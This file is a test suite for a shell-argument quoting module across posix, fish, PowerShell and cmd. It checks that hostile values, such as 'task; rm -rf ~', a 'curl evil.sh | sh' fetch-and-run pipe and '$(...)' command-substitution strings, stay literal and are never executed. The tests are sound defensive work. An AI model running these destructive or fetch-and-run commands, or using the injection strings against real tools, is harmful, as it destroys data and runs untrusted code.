import * as assert from "assert";
import { spawnSync } from "child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from "fs";
import { tmpdir } from "os";
import { join } from "path";

import {
  changeDirectoryCommand,
  quoteArg,
  quoteCommandLine,
  ShellKind,
  shellKindFromPath,
} from "../../core/shell-quote";

suite("Shell Quote Test Suite", () => {
  suite("quoteArg - posix", () => {
    test("returns safe tokens unchanged", () => {
      assert.strictEqual(quoteArg("inspect", "posix"), "inspect");
      assert.strictEqual(
        quoteArg("task.py@my_task", "posix"),
        "task.py@my_task"
      );
      assert.strictEqual(quoteArg("--limit=10", "posix"), "--limit=10");
    });

    test("single-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "posix"), "'my task'");
    });

    test("escapes embedded single quotes", () => {
      assert.strictEqual(quoteArg("it's", "posix"), "'it'\\''s'");
    });

    test("neutralizes shell metacharacters", () => {
      assert.strictEqual(
        quoteArg("task; rm -rf ~", "posix"),
        "'task; rm -rf ~'"
      );
    });
  });

  suite("quoteArg - fish", () => {
    test("escapes backslashes and quotes, including trailing backslashes", () => {
      assert.strictEqual(quoteArg("it's", "fish"), "'it\\'s'");
      assert.strictEqual(quoteArg("a\\", "fish"), "'a\\\\'");
      assert.strictEqual(quoteArg("\\'", "fish"), "'\\\\\\''");
      assert.strictEqual(quoteArg("", "fish"), "''");
      assert.strictEqual(quoteArg("task.py@demo", "fish"), "task.py@demo");
    });
  });

  // Run the generated text through real parsers. The only injected operation
  // used here would write a harmless marker inside a disposable test directory.
  for (const [shell, kind] of [
    ["sh", "posix"],
    ["bash", "posix"],
    ["fish", "fish"],
  ] as const satisfies ReadonlyArray<readonly [string, ShellKind]>) {
    suite(`real ${shell} argument round trips`, () => {
      suiteSetup(function () {
        // These fixtures contain Unix-only filenames and require a Unix shell
        // argv transport. Git Bash launched through Windows spawnSync also
        // undergoes Windows command-line escaping before Bash parses the text.
        if (process.platform === "win32") {
          this.skip();
        }
        const probe = spawnSync(
          shell,
          shell === "fish" ? ["--no-config", "--version"] : ["--version"],
          { encoding: "utf8" }
        );
        if (
          probe.error &&
          "code" in probe.error &&
          probe.error.code === "ENOENT"
        ) {
          if (shell === "fish" && process.env.REQUIRE_FISH_TESTS) {
            assert.fail("fish is required for this validation run");
          }
          this.skip();
        }
        assert.ifError(probe.error);
      });

      test("preserves targets and parameters without executing their contents", () => {
        const cwd = mkdtempSync(join(tmpdir(), "inspect-shell-quote-"));
        try {
          const values = [
            "",
            "task.py@demo",
            "my tasks/évaluation.py@demo",
            "../other tasks/t.py@x",
            "a,b",
            "@task",
            "--limit=10",
            "it's",
            "\\",
            "a\\\\b",
            "trailing\\",
            "a=\\",
            "b=;printf injected>marker;#",
            "line\nbreak",
            "tab\there",
            "both'\"quotes",
            "t\\';printf injected>marker;\\'.py@x",
            "$(printf injected>marker)",
            "(printf injected>marker)",
            "`printf injected>marker`",
            "$HOME",
            "*?[abc]{a,b}",
          ];
          // Exercise all short combinations around the vulnerable quote boundary.
          for (const a of ["\\", "'", ";", " "]) {
            for (const b of ["\\", "'", ";", " "]) {
              for (const c of ["\\", "'", ";", " "]) {
                values.push(`t${a}${b}${c}.py@x`);
              }
            }
          }
          const line = quoteCommandLine(["printf", "%s\\0", ...values], kind);
          const result = spawnSync(
            shell,
            [...(shell === "fish" ? ["--no-config"] : []), "-c", line],
            {
              cwd,
              encoding: "utf8",
              timeout: 5000,
            }
          );
          assert.ifError(result.error);
          assert.strictEqual(result.status, 0, result.stderr);
          assert.deepStrictEqual(result.stdout.split("\0"), [...values, ""]);
          assert.strictEqual(existsSync(join(cwd, "marker")), false);
        } finally {
          rmSync(cwd, { recursive: true, force: true });
        }
      });

      test("preserves a reused terminal's working directory", () => {
        const cwd = mkdtempSync(join(tmpdir(), "inspect-shell-cd-"));
        const directory = "tasks\\';printf injected>marker;\\'";
        mkdirSync(join(cwd, directory));
        try {
          const result = spawnSync(
            shell,
            [
              ...(shell === "fish" ? ["--no-config"] : []),
              "-c",
              `${changeDirectoryCommand(directory, kind)}; pwd`,
            ],
            {
              cwd,
              encoding: "utf8",
              timeout: 5000,
            }
          );
          assert.ifError(result.error);
          assert.strictEqual(result.status, 0, result.stderr);
          assert.ok(result.stdout.trimEnd().endsWith(`/${directory}`));
          assert.strictEqual(existsSync(join(cwd, "marker")), false);
        } finally {
          rmSync(cwd, { recursive: true, force: true });
        }
      });
    });
  }

  // PowerShell and cmd receive a real program path that needs quoting (spaces
  // and parentheses, as under `C:\Users\First Last`) plus arguments with the
  // characters Windows allows in file names. The program is a genuine venv
  // interpreter so the launch goes through each shell's own command lookup.
  suite("real PowerShell and cmd argument round trips", () => {
    const windows = process.platform === "win32";
    const locate = (name: string): string | undefined => {
      const found = spawnSync(windows ? "where.exe" : "which", [name], {
        encoding: "utf8",
      });
      return found.status === 0
        ? found.stdout.split(/\r?\n/)[0]?.trim()
        : undefined;
    };
    const shells: {
      name: string;
      kind: ShellKind;
      run: (line: string) => ReturnType<typeof spawnSync>;
      // Windows PowerShell 5.1 rebuilds a native command line by wrapping
      // whitespace-bearing arguments in double quotes without escaping, so a
      // trailing backslash or an embedded quote in such an argument is
      // corrupted by PowerShell itself before the program parses it. pwsh 7.3+
      // (`$PSNativeCommandArgumentPassing` = Windows) and cmd.exe pass what
      // our quoting produces; 5.1 is checked on the arguments it can carry.
      legacyArgumentPassing?: boolean;
    }[] = [];
    let root = "";
    let program = "";
    let argvScript = "";

    suiteSetup(function () {
      this.timeout(60000);
      const pwsh = locate("pwsh");
      if (pwsh) {
        shells.push({
          name: "pwsh",
          kind: "powershell",
          run: (line) =>
            spawnSync(
              pwsh,
              ["-NoProfile", "-NonInteractive", "-Command", line],
              {
                encoding: "utf8",
                timeout: 30000,
              }
            ),
        });
      } else if (process.env.REQUIRE_PWSH_TESTS) {
        assert.fail("PowerShell is required for this validation run");
      }
      if (windows) {
        shells.push({
          name: "Windows PowerShell",
          kind: "powershell",
          legacyArgumentPassing: true,
          run: (line) =>
            spawnSync(
              "powershell.exe",
              ["-NoProfile", "-NonInteractive", "-Command", line],
              { encoding: "utf8", timeout: 30000 }
            ),
        });
        shells.push({
          name: "cmd",
          kind: "cmd",
          run: (line) =>
            spawnSync("cmd.exe", ["/d", "/s", "/c", `"${line}"`], {
              encoding: "utf8",
              timeout: 30000,
              windowsVerbatimArguments: true,
            }),
        });
      }
      if (shells.length === 0) {
        this.skip();
      }
      root = mkdtempSync(join(tmpdir(), "quote env (1) "));
      const venv = join(root, "venv (2)");
      const created = spawnSync(
        windows ? "python" : "python3",
        ["-m", "venv", "--without-pip", venv],
        { encoding: "utf8", timeout: 60000 }
      );
      assert.strictEqual(created.status, 0, created.stderr);
      program = windows
        ? join(venv, "Scripts", "python.exe")
        : join(venv, "bin", "python");
      assert.ok(existsSync(program));
      argvScript = join(root, "argv (3).py");
      writeFileSync(
        argvScript,
        [
          "import json, sys",
          "with open(sys.argv[1], 'w', encoding='utf-8') as f:",
          "    json.dump(sys.argv[2:], f)",
          "",
        ].join("\n")
      );
    });

    suiteTeardown(() => {
      if (root) {
        rmSync(root, { recursive: true, force: true });
      }
    });

    test("a quoted program path and Windows-legal arguments arrive literally", function () {
      this.timeout(120000);
      const values = [
        "task.py@demo",
        "my tasks/demo.py@demo",
        "tasks (1)/demo.py@demo",
        "it's",
        "a&b",
        "x^y|z<w>v",
        "--limit=10",
        "a,b",
        "@task",
        "-T",
        "prompt=say hello; & goodbye",
        "$HOME",
        "évaluation",
        "demo’s task.py@demo",
        // A directory parameter keeps its trailing separator, and the
        // argument after it stays a separate argument.
        "directory=C:\\my data\\",
        "next",
        "C:\\my data\\\\",
        "trailing\\",
        "a\\\\b\\",
        "C:\\my data\\sub",
        'say "hi"',
        'quote\\"slash',
      ];
      for (const shell of shells) {
        const carried = shell.legacyArgumentPassing
          ? values.filter(
              (value) =>
                !value.includes('"') &&
                !(/\s/.test(value) && value.endsWith("\\"))
            )
          : values;
        const result = join(root, `${shell.name} result.json`);
        const line = quoteCommandLine(
          [program, argvScript, result, ...carried],
          shell.kind
        );
        const ran = shell.run(line);
        assert.ifError(ran.error);
        assert.strictEqual(
          ran.status,
          0,
          `${shell.name}: ${line}\n${String(ran.stdout)}${String(ran.stderr)}`
        );
        assert.deepStrictEqual(
          JSON.parse(readFileSync(result, "utf8")),
          carried,
          `${shell.name}: ${line}`
        );
      }
    });

    test("cmd's cd built-in receives a directory ending in a separator as typed", function () {
      const cmd = shells.find((shell) => shell.kind === "cmd");
      if (!cmd) {
        this.skip();
        return;
      }
      const directory = join(root, "work space (4)");
      mkdirSync(directory);
      const ran = cmd.run(
        `${changeDirectoryCommand(`${directory}\\`, "cmd")} && cd`
      );
      assert.ifError(ran.error);
      assert.strictEqual(
        ran.status,
        0,
        `${String(ran.stdout)}${String(ran.stderr)}`
      );
      assert.strictEqual(
        realpathSync.native(String(ran.stdout).trim()).toLowerCase(),
        realpathSync.native(directory).toLowerCase()
      );
    });
  });

  suite("quoteArg - powershell", () => {
    test("single-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "powershell"), "'my task'");
    });

    test("escapes embedded single quotes by doubling", () => {
      assert.strictEqual(quoteArg("it's", "powershell"), "'it''s'");
    });

    test("neutralizes shell metacharacters", () => {
      assert.strictEqual(
        quoteArg("task; rm $env:HOME", "powershell"),
        "'task; rm $env:HOME'"
      );
    });

    test("quotes a comma so PowerShell does not split it into an array", () => {
      // In PowerShell argument mode 'a,b' is the array operator; quoting keeps
      // it a single literal argument.
      assert.strictEqual(
        quoteArg("tasks.py@demo,--model-base-url,https://x", "powershell"),
        "'tasks.py@demo,--model-base-url,https://x'"
      );
      assert.strictEqual(quoteArg("1,2", "powershell"), "'1,2'");
    });

    test("doubles Unicode smart quotes so they cannot terminate the string", () => {
      // PowerShell treats U+2018–U+201B as single-quote characters, so an
      // embedded smart quote (common in macOS file names) must be doubled or it
      // would end the quoted string and break the command.
      const payload = "demo" + "’" + "s task" + "’";
      const quoted = quoteArg(payload, "powershell");
      assert.strictEqual(quoted, "'demo’’s task’’'");
    });

    test("quotes a leading @ (splatting/array subexpression)", () => {
      assert.strictEqual(quoteArg("@evil", "powershell"), "'@evil'");
    });

    test("still passes a comma unquoted to POSIX and cmd", () => {
      assert.strictEqual(quoteArg("1,2", "posix"), "1,2");
      assert.strictEqual(quoteArg("1,2", "cmd"), "1,2");
    });
  });

  suite("quoteArg - cmd", () => {
    test("double-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "cmd"), '"my task"');
    });

    test("keeps cmd metacharacters literal inside the quotes", () => {
      // A caret is not an escape inside double quotes; adding one would hand
      // `tasks ^(1^)` to the program.
      assert.strictEqual(quoteArg("a&b|c", "cmd"), '"a&b|c"');
      assert.strictEqual(
        quoteArg("tasks (1)/demo.py", "cmd"),
        '"tasks (1)/demo.py"'
      );
    });

    test("escapes embedded double quotes", () => {
      assert.strictEqual(quoteArg('say "hi"', "cmd"), '"say ""hi"""');
    });

    test("doubles a backslash run that would otherwise escape a quote", () => {
      // The program's C runtime reads `\"` as a literal quote, so a directory
      // parameter ending in a separator must not leave its backslash against
      // the closing quote: "directory=C:\my data\" would arrive as
      // `directory=C:\my data"` with the next argument appended to it.
      assert.strictEqual(
        quoteArg("directory=C:\\my data\\", "cmd"),
        '"directory=C:\\my data\\\\"'
      );
      assert.strictEqual(
        quoteArg("C:\\my data\\\\", "cmd"),
        '"C:\\my data\\\\\\\\"'
      );
      // Before an embedded quote the run is doubled too; the quote itself is
      // still written as "" so cmd.exe keeps the argument in one quoted span.
      assert.strictEqual(quoteArg('a\\"b', "cmd"), '"a\\\\""b"');
      // Backslashes not followed by a quote are literal and stay single.
      assert.strictEqual(
        quoteArg("C:\\my data\\sub", "cmd"),
        '"C:\\my data\\sub"'
      );
    });
  });

  suite("quoteCommandLine", () => {
    test("leaves safe tokens bare and only quotes what needs it", () => {
      // "inspect" and "eval" are safe; "my task.py@t" has a space and needs quoting.
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "my task.py@t"], "posix"),
        "inspect eval 'my task.py@t'"
      );
    });

    test("quotes a hostile target as a single literal token", () => {
      const hostile = "task.py; curl evil.sh | sh";
      const line = quoteCommandLine(["inspect", "eval", hostile], "posix");
      assert.strictEqual(line, `inspect eval '${hostile}'`);
    });

    test("safe tokens are bare across all shell kinds", () => {
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "task.py@my_task"], "powershell"),
        "inspect eval task.py@my_task"
      );
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "task.py@my_task"], "cmd"),
        "inspect eval task.py@my_task"
      );
    });

    test("invokes a quoted program through PowerShell's call operator", () => {
      assert.strictEqual(
        quoteCommandLine(
          [
            "C:\\Users\\First Last\\.venv\\Scripts\\inspect.exe",
            "eval",
            "t.py",
          ],
          "powershell"
        ),
        "& 'C:\\Users\\First Last\\.venv\\Scripts\\inspect.exe' eval t.py"
      );
      // Other shells run a quoted first token directly.
      assert.strictEqual(
        quoteCommandLine(["/my env/bin/inspect", "eval", "t.py"], "posix"),
        "'/my env/bin/inspect' eval t.py"
      );
      assert.strictEqual(
        quoteCommandLine(["C:\\my env\\inspect.exe", "eval", "t.py"], "cmd"),
        '"C:\\my env\\inspect.exe" eval t.py'
      );
    });
  });

  suite("changeDirectoryCommand", () => {
    test("switches drives on cmd and stays literal on PowerShell", () => {
      assert.strictEqual(
        changeDirectoryCommand("D:\\work space", "cmd"),
        'cd /d "D:\\work space"'
      );
      // `cd` is a cmd.exe built-in, not a program: no C runtime parses its
      // argument, so a trailing separator is passed as typed rather than
      // doubled the way a program argument's would be.
      assert.strictEqual(changeDirectoryCommand("D:\\", "cmd"), 'cd /d "D:\\"');
      assert.strictEqual(
        changeDirectoryCommand("D:\\work space\\", "cmd"),
        'cd /d "D:\\work space\\"'
      );
      assert.strictEqual(
        changeDirectoryCommand("D:\\work [1]", "powershell"),
        "cd -LiteralPath 'D:\\work [1]'"
      );
      assert.strictEqual(
        changeDirectoryCommand("/work space", "posix"),
        "cd '/work space'"
      );
      assert.strictEqual(changeDirectoryCommand("/work", "fish"), "cd /work");
    });
  });

  suite("shellKindFromPath", () => {
    test("returns undefined when the shell can't be identified", () => {
      assert.strictEqual(shellKindFromPath(undefined), undefined);
      assert.strictEqual(shellKindFromPath(""), undefined);
      assert.strictEqual(
        shellKindFromPath("C:\\some\\custom-shell.exe"),
        undefined
      );
      assert.strictEqual(shellKindFromPath("nu"), undefined);
    });

    test("positively identifies known shells", () => {
      assert.strictEqual(shellKindFromPath("/bin/bash"), "posix");
      assert.strictEqual(shellKindFromPath("/opt/homebrew/bin/fish"), "fish");
      assert.strictEqual(shellKindFromPath("fish"), "fish");
      assert.strictEqual(shellKindFromPath("C:\\shells\\fish.exe"), "fish");
      assert.strictEqual(shellKindFromPath("cmd.exe"), "cmd");
      assert.strictEqual(shellKindFromPath("pwsh"), "powershell");
    });

    test("accepts the shell types VS Code reports in terminal.state.shell", () => {
      assert.strictEqual(shellKindFromPath("gitbash"), "posix");
      assert.strictEqual(shellKindFromPath("zsh"), "posix");
      assert.strictEqual(shellKindFromPath("pwsh"), "powershell");
      assert.strictEqual(shellKindFromPath("cmd"), "cmd");
    });
  });
});
